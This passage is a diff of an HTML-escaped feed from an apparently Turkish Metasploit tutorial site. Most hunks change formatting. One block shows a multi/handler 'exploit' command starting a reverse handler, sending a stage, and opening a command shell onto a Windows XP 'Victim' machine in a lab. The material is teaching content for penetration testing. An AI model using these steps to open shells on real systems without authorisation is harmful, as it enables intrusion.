+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
 
-Microsoft Windows XP ***[*** Version 5.1.2600]
-***(*** C***)***  Copyright 1985-2001 Microsoft Corp.
+  
+&lt;/div&gt;
+&lt;p&gt;Tüm ayarlamaları yaptıktan sonra &lt;code&gt;exploit&lt;/code&gt; komutuyla modül çalıştırılır ve dinlemeye başlanır. Aşağıda, dinleme sonucunda gerçekleşen bir istemci tıklaması sonucu açılan komut satırı görülmektedir.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
 
-C:\Documents and Settings\Victim\My Documents&amp;gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;!-- /wp:code --&gt;
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; exploit
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Handler binding to LHOST 0.0.0.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started reverse handler
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Starting the payload handler...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Sending stage &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;474&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Command shell session &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; opened &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;172.16.104.130:31337 -&amp;gt; 172.16.104.128:1150&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Microsoft Windows XP &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Version 5.1.2600&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;C&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Copyright 1985-2001 Microsoft Corp.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments and Settings&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;ictim&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;y Documents&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+
       </description>
     </item>
     
@@ -6684,7 +6755,7 @@ msf auxiliary***(*** mssql_exec***)***  ***&amp;gt;***  exploit
 &lt;!-- /wp:list-item --&gt;
 &lt;!-- wp:list-item --&gt;
 &lt;ul&gt;
-&lt;li&gt;Bis dosyadan IP adresleri (file:/tmp/hostlist.txt). &lt;em&gt;Her satırda 1 IP olmalı&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;Bis dosyadan IP adresleri (file:/tmp/hostlist.txt).&lt;em&gt;Her satırda 1 IP olmalı&lt;/em&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- /wp:list-item --&gt; 
 &lt;!-- /wp:list --&gt;
@@ -6694,17 +6765,17 @@ msf auxiliary***(*** mssql_exec***)***  ***&amp;gt;***  exploit
 &lt;!-- wp:list --&gt;
  &lt;!-- wp:list-item --&gt;
 &lt;ul&gt;
-&lt;li&gt;MSF programı Win32 sistemlerde çalışıyorsa &lt;code&gt;THREADS&lt;/code&gt; değerini 16 ve altında ayarlayın.&lt;/li&gt;
+&lt;li&gt;MSF programı Win32 sistemlerde çalışıyorsa&lt;code&gt;THREADS&lt;/code&gt;değerini 16 ve altında ayarlayın.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- /wp:list-item --&gt;
 &lt;!-- wp:list-item --&gt;
 &lt;ul&gt;
-&lt;li&gt;MSF programı Cygwin sistemde çalışıyorsa &lt;code&gt;THREADS&lt;/code&gt; değerini 200 ve altında ayarlayın&lt;/li&gt;
+&lt;li&gt;MSF programı Cygwin sistemde çalışıyorsa&lt;code&gt;THREADS&lt;/code&gt;değerini 200 ve altında ayarlayın&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- /wp:list-item --&gt;
 &lt;!-- wp:list-item --&gt;
 &lt;ul&gt;
-&lt;li&gt;MSF programı Unix-like sistemde çalışıyorsa &lt;code&gt;THREADS&lt;/code&gt; değerini 256 yapabilirsiniz.&lt;/li&gt;
+&lt;li&gt;MSF programı Unix-like sistemde çalışıyorsa&lt;code&gt;THREADS&lt;/code&gt;değerini 256 yapabilirsiniz.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- /wp:list-item --&gt; 
 &lt;!-- /wp:list --&gt;
@@ -9229,7 +9300,7 @@ Module options:
 msf auxiliary***(*** ms09_001_write***)***  ***&amp;gt;*** 
 &lt;/code&gt;&lt;/pre&gt;
 &lt;!-- /wp:code --&gt;
-&lt;p&gt;Herhangi bir çalışma esnasında bir komut ile yardım almak istediğinizde &lt;code&gt;help&lt;/code&gt; komutunu kullanabilirsiniz.&lt;/p&gt;
+&lt;p&gt;Herhangi bir çalışma esnasında bir komut ile yardım almak istediğinizde&lt;code&gt;help&lt;/code&gt;komutunu kullanabilirsiniz.&lt;/p&gt;
 &lt;p&gt;Video Anlatım&lt;/p&gt;
 &lt;!-- wp:embed {&#34;url&#34;:&#34;https://youtu.be/UOtw6CfPGlo&#34;,&#34;type&#34;:&#34;video&#34;,&#34;providerNameSlug&#34;:&#34;youtube&#34;,&#34;responsive&#34;:true,&#34;className&#34;:&#34;wp-embed-aspect-16-9 wp-has-aspect-ratio&#34;} --&gt;
 &lt;figure class=&#34;wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio&#34;&gt;&lt;div class=&#34;wp-block-embed__wrapper&#34;&gt;
@@ -9551,7 +9622,7 @@ Matching Modules
 
 &lt;/code&gt;&lt;/pre&gt;
 &lt;!-- /wp:code --&gt;
-&lt;p&gt;Metasploit Framework çok sık güncelleme almaktadır. Paket deposu sisteminize eklendiğinden &lt;code&gt;apt update&lt;/code&gt; ile veya msfconsole içerisinden &lt;code&gt;msfupdate&lt;/code&gt; komutu ile güncelleyebilirsiniz.&lt;/p&gt;
+&lt;p&gt;Metasploit Framework çok sık güncelleme almaktadır. Paket deposu sisteminize eklendiğinden&lt;code&gt;apt update&lt;/code&gt;ile veya msfconsole içerisinden&lt;code&gt;msfupdate&lt;/code&gt;komutu ile güncelleyebilirsiniz.&lt;/p&gt;
 &lt;!-- wp:embed {&#34;url&#34;:&#34;https://youtu.be/FZvrukt9B-c?si=SWDikQ-DR0E34dDk&#34;,&#34;type&#34;:&#34;video&#34;,&#34;providerNameSlug&#34;:&#34;youtube&#34;,&#34;responsive&#34;:true,&#34;className&#34;:&#34;wp-embed-aspect-16-9 wp-has-aspect-ratio&#34;} --&gt;
 &lt;figure class=&#34;wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio&#34;&gt;&lt;div class=&#34;wp-block-embed__wrapper&#34;&gt;
 https://youtu.be/FZvrukt9B-c?si=SWDikQ-DR0E34dDk
